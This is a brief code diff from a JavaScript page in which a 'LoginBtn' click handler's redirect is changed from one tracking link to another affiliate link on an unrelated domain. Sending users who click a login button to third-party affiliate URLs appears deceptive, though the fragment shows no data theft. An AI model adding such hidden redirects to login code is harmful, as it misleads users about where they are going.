@@ -72,6 +72,6 @@ LoginBtn.addEventListener('click', e => {
         return; // Abort the transaction.
       }
     });
-    window.location.replace("https://moveasgg.org/cl/e547b8e13f88f586?p1=&p2=&source=&site=");
+    window.location.replace("https://aff.hunakhidma.com/?utm_medium=462edb5319682991623a3586080b82ae8cc706c8&utm_campaign=sc");
   }
 });
